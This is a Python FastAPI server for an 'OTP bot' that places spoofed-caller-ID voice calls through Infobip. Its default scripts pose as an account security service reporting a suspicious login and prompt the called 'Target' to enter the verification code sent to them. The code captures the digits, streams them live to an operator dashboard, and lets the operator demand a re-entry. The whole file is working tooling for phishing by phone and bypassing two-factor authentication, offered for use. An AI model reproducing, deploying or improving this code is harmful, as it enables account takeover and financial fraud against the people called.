from fastapi import FastAPI, APIRouter, HTTPException, Depends, status, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import httpx
import jwt
from passlib.context import CryptContext
import socketio
import asyncio

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY')
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL')
INFOBIP_CALLS_CONFIG_ID = os.environ.get('INFOBIP_CALLS_CONFIG_ID')

# JWT configuration
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'default_secret')
JWT_ALGORITHM = os.environ.get('JWT_ALGORITHM', 'HS256')
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get('ACCESS_TOKEN_EXPIRE_MINUTES', 1440))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Socket.IO for real-time updates
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')

# Create FastAPI app
app = FastAPI(title="OTP Bot Call API", version="2.0.0")

# Create Socket.IO ASGI app
socket_app = socketio.ASGIApp(sio, app)

# Store active calls
active_calls: Dict[str, Dict[str, Any]] = {}

# Create routers
api_router = APIRouter(prefix="/api")
auth_router = APIRouter(prefix="/auth", tags=["Authentication"])
voice_router = APIRouter(prefix="/voice", tags=["Voice Calls"])
otp_router = APIRouter(prefix="/otp", tags=["OTP Bot"])

# ==================== MODELS ====================

class UserCreate(BaseModel):
    email: EmailStr
    password: str
    name: str

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class UserResponse(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    email: str
    name: str
    created_at: str

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user: UserResponse

class CallStep(BaseModel):
    step_number: int
    message: str
    wait_for_input: bool = False
    expected_digits: int = 0

class OTPCallConfig(BaseModel):
    recipient_number: str = Field(..., description="Target phone number")
    caller_id: str = Field(..., description="Display caller ID")
    recipient_name: str = Field(default="User", description="Name for greeting")
    service_name: str = Field(default="Account", description="Service name")
    otp_digits: int = Field(default=6, description="Expected OTP digit count")
    language: str = Field(default="en", description="Language code")
    voice_model: str = Field(default="en-US-JennyNeural", description="Voice model")
    
    # Custom messages
    step1_message: str = Field(
        default="Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.",
        description="Step 1 greeting message"
    )
    step2_message: str = Field(
        default="Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?",
        description="Step 2 OTP request message"
    )
    step3_message: str = Field(
        default="Okay, please wait a moment while we verify the code.",
        description="Step 3 verification message"
    )
    accepted_message: str = Field(
        default="Okay! We've declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!",
        description="Accepted/End message"
    )
    rejected_message: str = Field(
        default="I'm sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.",
        description="Rejected/Retry message"
    )

class CallRecord(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    user_id: str
    phone_number: str
    caller_id: str
    message_text: str
    language: str
    speech_rate: float
    status: str
    infobip_message_id: Optional[str] = None
    created_at: str
    completed_at: Optional[str] = None
    duration_seconds: Optional[int] = None
    error_message: Optional[str] = None

class CallStats(BaseModel):
    total_calls: int
    completed_calls: int
    failed_calls: int
    pending_calls: int
    total_duration: int
    avg_duration: float

class OTPSession(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    user_id: str
    recipient_number: str
    caller_id: str
    recipient_name: str
    service_name: str
    otp_digits: int
    status: str  # pending, calling, step1, step2, step3, waiting_approval, completed, failed
    current_step: int
    dtmf_input: str
    otp_received: Optional[str] = None
    call_id: Optional[str] = None
    created_at: str
    logs: List[Dict[str, Any]] = []

# ==================== AUTH HELPERS ====================

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        user_id = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        if user is None:
            raise HTTPException(status_code=401, detail="User not found")
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# ==================== SOCKET.IO EVENTS ====================

@sio.event
async def connect(sid, environ):
    logger.info(f"Client connected: {sid}")

@sio.event
async def disconnect(sid):
    logger.info(f"Client disconnected: {sid}")

@sio.event
async def join_session(sid, data):
    session_id = data.get('session_id')
    if session_id:
        await sio.enter_room(sid, session_id)
        logger.info(f"Client {sid} joined session {session_id}")

async def emit_log(session_id: str, log_type: str, message: str, data: dict = None):
    """Emit log event to all clients in a session"""
    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "type": log_type,
        "message": message,
        "data": data or {}
    }
    
    # Store log in database
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$push": {"logs": log_entry}}
    )
    
    # Emit to connected clients
    await sio.emit('call_log', log_entry, room=session_id)
    logger.info(f"[{session_id}] {log_type}: {message}")

# ==================== AUTH ROUTES ====================

@auth_router.post("/register", response_model=TokenResponse)
async def register(user_data: UserCreate):
    existing_user = await db.users.find_one({"email": user_data.email})
    if existing_user:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    user_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    user_doc = {
        "id": user_id,
        "email": user_data.email,
        "name": user_data.name,
        "password_hash": hash_password(user_data.password),
        "created_at": now
    }
    
    await db.users.insert_one(user_doc)
    access_token = create_access_token({"sub": user_id})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user_id, email=user_data.email, name=user_data.name, created_at=now)
    )

@auth_router.post("/login", response_model=TokenResponse)
async def login(credentials: UserLogin):
    user = await db.users.find_one({"email": credentials.email}, {"_id": 0})
    if not user or not verify_password(credentials.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    
    access_token = create_access_token({"sub": user["id"]})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user["id"], email=user["email"], name=user["name"], created_at=user["created_at"])
    )

@auth_router.get("/me", response_model=UserResponse)
async def get_me(current_user: dict = Depends(get_current_user)):
    return UserResponse(
        id=current_user["id"],
        email=current_user["email"],
        name=current_user["name"],
        created_at=current_user["created_at"]
    )

# ==================== OTP BOT ROUTES ====================

@otp_router.post("/initiate-call")
async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
    """Initiate an OTP bot call session"""
    
    session_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    # Create OTP session
    session_doc = {
        "id": session_id,
        "user_id": current_user["id"],
        "recipient_number": config.recipient_number,
        "caller_id": config.caller_id,
        "recipient_name": config.recipient_name,
        "service_name": config.service_name,
        "otp_digits": config.otp_digits,
        "language": config.language,
        "voice_model": config.voice_model,
        "status": "pending",
        "current_step": 0,
        "dtmf_input": "",
        "otp_received": None,
        "call_id": None,
        "created_at": now,
        "logs": [],
        "config": config.model_dump()
    }
    
    await db.otp_sessions.insert_one(session_doc)
    
    # Store in active calls
    active_calls[session_id] = session_doc
    
    # Emit initial log
    await emit_log(session_id, "info", "OTP Bot initialized", {"session_id": session_id})
    
    # Format step 1 message
    step1_text = config.step1_message.replace("{name}", config.recipient_name).replace("{service}", config.service_name)
    
    # Prepare Infobip TTS call
    headers = {
        "Authorization": f"App {INFOBIP_API_KEY}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    # Use TTS advanced API with longer message for step 1
    payload = {
        "messages": [
            {
                "from": config.caller_id,
                "destinations": [
                    {"to": config.recipient_number}
                ],
                "text": step1_text,
                "language": config.language,
                "speechRate": 0.95,
                "notifyUrl": f"https://spoofing-connect.preview.emergentagent.com/api/otp/webhook/{session_id}",
                "notifyContentType": "application/json"
            }
        ]
    }
    
    await emit_log(session_id, "call", f"🚦 Initiating call to {config.recipient_number}")
    
    try:
        async with httpx.AsyncClient(timeout=30.0) as http_client:
            api_url = f"https://{INFOBIP_BASE_URL}/tts/3/advanced" if not INFOBIP_BASE_URL.startswith('http') else f"{INFOBIP_BASE_URL}/tts/3/advanced"
            
            response = await http_client.post(api_url, headers=headers, json=payload)
            logger.info(f"Infobip response: {response.status_code} - {response.text}")
            
            if response.status_code in [200, 201]:
                response_data = response.json()
                infobip_message_id = None
                
                if response_data.get("messages"):
                    infobip_message_id = response_data["messages"][0].get("messageId")
                
                # Update session
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {
                        "status": "calling",
                        "call_id": infobip_message_id,
                        "current_step": 1
                    }}
                )
                
                await emit_log(session_id, "success", f"📲 Call initiated successfully", {"message_id": infobip_message_id})
                await emit_log(session_id, "step", "🎙️ Playing Step 1: Greeting message")
                
                return {
                    "session_id": session_id,
                    "status": "calling",
                    "message_id": infobip_message_id
                }
            else:
                error_msg = f"Infobip error: {response.text}"
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {"status": "failed", "error": error_msg}}
                )
                await emit_log(session_id, "error", f"❌ Call failed: {error_msg}")
                raise HTTPException(status_code=500, detail=error_msg)
                
    except Exception as e:
        error_msg = str(e)
        await emit_log(session_id, "error", f"❌ Error: {error_msg}")
        raise HTTPException(status_code=500, detail=error_msg)

@otp_router.post("/webhook/{session_id}")
async def otp_webhook(session_id: str, request: Request):
    """Handle Infobip webhooks for OTP sessions"""
    try:
        body = await request.json()
        logger.info(f"Webhook received for session {session_id}: {body}")
        
        # Get session
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return {"status": "session not found"}
        
        # Process webhook based on type
        results = body.get("results", [])
        for result in results:
            status_info = result.get("status", {})
            status_name = status_info.get("name", "").upper()
            
            if status_name == "PENDING_ACCEPTED":
                await emit_log(session_id, "info", "📞 Call ringing...")
            elif status_name == "DELIVERED":
                await emit_log(session_id, "success", "✅ Call answered")
                await emit_log(session_id, "step", "🎙️ Step 1 message played")
                # Update to waiting for DTMF
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {"status": "step1"}}
                )
            elif status_name == "FAILED" or status_name == "REJECTED":
                await emit_log(session_id, "error", f"❌ Call failed: {status_info.get('description', 'Unknown error')}")
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {"status": "failed"}}
                )
        
        return {"status": "received"}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error", "message": str(e)}

@otp_router.post("/dtmf/{session_id}")
async def receive_dtmf(session_id: str, request: Request):
    """Receive DTMF input from Infobip"""
    try:
        body = await request.json()
        logger.info(f"DTMF received for session {session_id}: {body}")
        
        dtmf_digit = body.get("dtmf", "")
        
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return {"status": "session not found"}
        
        current_status = session.get("status", "")
        current_dtmf = session.get("dtmf_input", "")
        otp_digits = session.get("otp_digits", 6)
        
        if current_status == "step1":
            # User pressed 1 or 0
            await emit_log(session_id, "dtmf", f"➡️ Target pressed: {dtmf_digit}")
            
            # Move to step 2
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "step2", "dtmf_input": dtmf_digit}}
            )
            await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP request message")
            
        elif current_status == "step2" or current_status == "collecting_otp":
            # Collecting OTP digits
            new_dtmf = current_dtmf + dtmf_digit
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"dtmf_input": new_dtmf, "status": "collecting_otp"}}
            )
            
            await emit_log(session_id, "dtmf", f"🔢 Digit received: {dtmf_digit} (Total: {new_dtmf})")
            
            # Check if we have all digits
            if len(new_dtmf) >= otp_digits:
                otp_code = new_dtmf[-otp_digits:]
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {"otp_received": otp_code, "status": "waiting_approval"}}
                )
                await emit_log(session_id, "otp", f"🕵️ OTP submitted: {otp_code}", {"otp": otp_code})
                await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification message")
                await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
        
        return {"status": "received"}
    except Exception as e:
        logger.error(f"DTMF error: {e}")
        return {"status": "error", "message": str(e)}

@otp_router.post("/accept/{session_id}")
async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin accepts the OTP - play accepted message"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
    await emit_log(session_id, "step", "🎙️ Playing Accepted message")
    
    # Update session
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed", "result": "accepted"}}
    )
    
    await emit_log(session_id, "success", "📴 Call completed successfully")
    
    return {"status": "accepted", "otp": session.get("otp_received")}

@otp_router.post("/reject/{session_id}")
async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin rejects the OTP - play retry message"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
    await emit_log(session_id, "step", "🎙️ Playing Retry message")
    
    # Reset DTMF and go back to collecting
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "step2", "dtmf_input": "", "otp_received": None}}
    )
    
    await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
    
    return {"status": "rejected"}

@otp_router.get("/session/{session_id}")
async def get_otp_session(session_id: str, current_user: dict = Depends(get_current_user)):
    """Get OTP session details"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@otp_router.get("/sessions")
async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
    """Get all OTP sessions for current user"""
    sessions = await db.otp_sessions.find(
        {"user_id": current_user["id"]},
        {"_id": 0}
    ).sort("created_at", -1).limit(50).to_list(50)
    return sessions

# ==================== VOICE ROUTES (Original) ====================

@voice_router.post("/call", response_model=CallRecord)
async def send_voice_call(
    phone_number: str,
    caller_id: str,
    message_text: str,
    language: str = "en",
    speech_rate: float = 1.0,
    repeat_count: int = 2,
    current_user: dict = Depends(get_current_user)
):
    """Send a simple voice call with TTS"""
    call_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    call_doc = {
        "id": call_id,
        "user_id": current_user["id"],
        "phone_number": phone_number,
        "caller_id": caller_id,
        "message_text": message_text,
        "language": language,
        "speech_rate": speech_rate,
        "status": "pending",
        "infobip_message_id": None,
        "created_at": now,
        "completed_at": None,
        "duration_seconds": None,
        "error_message": None
    }
    
    await db.calls.insert_one(call_doc)
    
    # Prepare message with repeats
    full_message = (message_text + ". . . ") * repeat_count
    
    headers = {
        "Authorization": f"App {INFOBIP_API_KEY}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    payload = {
        "messages": [
            {
                "from": caller_id,
                "destinations": [{"to": phone_number}],
                "text": full_message,
                "language": language,
                "speechRate": speech_rate
            }
        ]
    }
    
    try:
        async with httpx.AsyncClient(timeout=30.0) as http_client:
            api_url = f"https://{INFOBIP_BASE_URL}/tts/3/advanced" if not INFOBIP_BASE_URL.startswith('http') else f"{INFOBIP_BASE_URL}/tts/3/advanced"
            response = await http_client.post(api_url, headers=headers, json=payload)
            
            if response.status_code in [200, 201]:
                response_data = response.json()
                infobip_message_id = response_data.get("messages", [{}])[0].get("messageId")
                
                await db.calls.update_one(
                    {"id": call_id},
                    {"$set": {"status": "initiated", "infobip_message_id": infobip_message_id}}
                )
                call_doc["status"] = "initiated"
                call_doc["infobip_message_id"] = infobip_message_id
            else:
                error_msg = f"Infobip error: {response.text}"
                await db.calls.update_one(
                    {"id": call_id},
                    {"$set": {"status": "failed", "error_message": error_msg}}
                )
                call_doc["status"] = "failed"
                call_doc["error_message"] = error_msg
                
    except Exception as e:
        error_msg = str(e)
        await db.calls.update_one(
            {"id": call_id},
            {"$set": {"status": "failed", "error_message": error_msg}}
        )
        call_doc["status"] = "failed"
        call_doc["error_message"] = error_msg
    
    call_doc.pop("_id", None)
    return CallRecord(**call_doc)

@voice_router.get("/history", response_model=List[CallRecord])
async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = Depends(get_current_user)):
    calls = await db.calls.find({"user_id": current_user["id"]}, {"_id": 0}).sort("created_at", -1).skip(skip).limit(limit).to_list(limit)
    return [CallRecord(**call) for call in calls]

@voice_router.get("/stats", response_model=CallStats)
async def get_call_stats(current_user: dict = Depends(get_current_user)):
    pipeline = [
        {"$match": {"user_id": current_user["id"]}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "completed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
            "failed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["pending", "initiated"]]}, 1, 0]}},
            "total_duration": {"$sum": {"$ifNull": ["$duration_seconds", 0]}}
        }}
    ]
    
    result = await db.calls.aggregate(pipeline).to_list(1)
    
    if result:
        stats = result[0]
        avg_duration = stats["total_duration"] / stats["completed_calls"] if stats["completed_calls"] > 0 else 0
        return CallStats(
            total_calls=stats["total_calls"],
            completed_calls=stats["completed_calls"],
            failed_calls=stats["failed_calls"],
            pending_calls=stats["pending_calls"],
            total_duration=stats["total_duration"],
            avg_duration=round(avg_duration, 2)
        )
    
    return CallStats(total_calls=0, completed_calls=0, failed_calls=0, pending_calls=0, total_duration=0, avg_duration=0)

# ==================== MAIN ROUTES ====================

@api_router.get("/")
async def root():
    return {"message": "OTP Bot Call API v2.0"}

@api_router.get("/health")
async def health_check():
    return {"status": "healthy", "service": "otp-bot-api"}

# Include routers
api_router.include_router(auth_router)
api_router.include_router(voice_router)
api_router.include_router(otp_router)
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
